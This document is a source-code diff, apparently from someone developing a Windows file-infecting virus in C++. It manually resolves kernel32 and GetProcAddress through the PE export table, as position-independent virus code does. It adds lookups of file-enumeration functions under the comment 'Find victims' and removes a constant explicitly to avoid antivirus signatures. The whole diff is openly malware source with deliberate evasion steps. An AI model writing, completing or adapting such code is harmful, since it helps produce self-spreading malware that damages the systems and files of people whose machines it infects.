@@ -10,7 +10,7 @@ int main() {
 	//some debug stuff can be placed here
 	auto pKernel32 = GetModuleHandle("kernel32.dll");
 
-	__asm {//using inline asm  just to debug code
+	__asm {//using inline asm just to debug code
 		push pKernel32
 	}
 	
@@ -18,7 +18,8 @@ int main() {
 	start();
 }
 
-//====================================================================================================
+//####################################################################################################
+//####################################################################################################
 TYPE_SIZE MARKER_BODYBEGIN() {
 	TYPE_SIZE curEIP = getEIP();
 	const TYPE_SIZE offsetTillFuncBegin = 0x9;
@@ -65,7 +66,7 @@ void start() {
 	//+0x4/0x8	Function stack frame ptr (ebp/rbp)
 	//0x0		kernel32_addr
 
-	TYPE_SIZE stackIter[1] = {0xDEADBEEF}; //TODO remove value cos it can be a signature
+	TYPE_SIZE stackIter[1] = {0};//TODO remove unnecessary initializer
 	CVirusData dataObject;
 
 	//Get addr somewhere in kernel32 from stack
@@ -80,7 +81,6 @@ void start() {
 
 	auto OptionalPEHeaderAddr = MainPESignatureOffsetAddr + sizeof(IMAGE_FILE_HEADER) + sizeof(IMAGE_NT_HEADERS::Signature);
 
-	
 	auto imageDataDirExportAddr = ((IMAGE_OPTIONAL_HEADER*)OptionalPEHeaderAddr)->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress+kernel32Addr;
 	auto pExportFuncsNames = ((IMAGE_EXPORT_DIRECTORY*)imageDataDirExportAddr)->AddressOfNames + kernel32Addr;
 
@@ -90,11 +90,13 @@ void start() {
 		if (strcmp((TYPE_BYTE*)curFuncNameAddr, (TYPE_BYTE*)dataObject.funcname_GetProcAddress) == true) { break; }
 	} while (++i);
 	auto getProcAddrOrdinal = ((TYPE_WORD*)(((IMAGE_EXPORT_DIRECTORY*)imageDataDirExportAddr)->AddressOfNameOrdinals + kernel32Addr))[i];
-	dataObject.addr_GetProcAddress = (void*)((unsigned)   ((TYPE_SIZE*)( ((IMAGE_EXPORT_DIRECTORY*)imageDataDirExportAddr)->AddressOfFunctions + kernel32Addr) )[getProcAddrOrdinal]+kernel32Addr);
+	dataObject.addr_GetProcAddress = (decltype(dataObject.addr_GetProcAddress))((unsigned)((TYPE_SIZE*)( ((IMAGE_EXPORT_DIRECTORY*)imageDataDirExportAddr)->AddressOfFunctions + kernel32Addr) )[getProcAddrOrdinal]+kernel32Addr);
 	
-	//Acquire other funcs addresses with GetProcAddr
-
-	kernel32Addr++;
+	//Find victims (FindFirstFile/FindNextFile)
+	dataObject.addr_FindFirstFileA = (decltype(dataObject.addr_FindFirstFileA))dataObject.addr_GetProcAddress((HMODULE)kernel32Addr, dataObject.funcname_FindFirstFileA);
+	dataObject.addr_FindNextFileA = (decltype(dataObject.addr_FindNextFileA))dataObject.addr_GetProcAddress((HMODULE)kernel32Addr, dataObject.funcname_FindNextFileA);
+	
+	kernel32Addr++; //TODO statement for debug; remove
 }
 
 //====================================================================================================
@@ -103,3 +105,6 @@ TYPE_SIZE MARKER_BODYEND() {
 	const TYPE_SIZE offsetTillFuncEnd = 0x14;
 	return curEIP + offsetTillFuncEnd;
 }
+
+//####################################################################################################
+//####################################################################################################
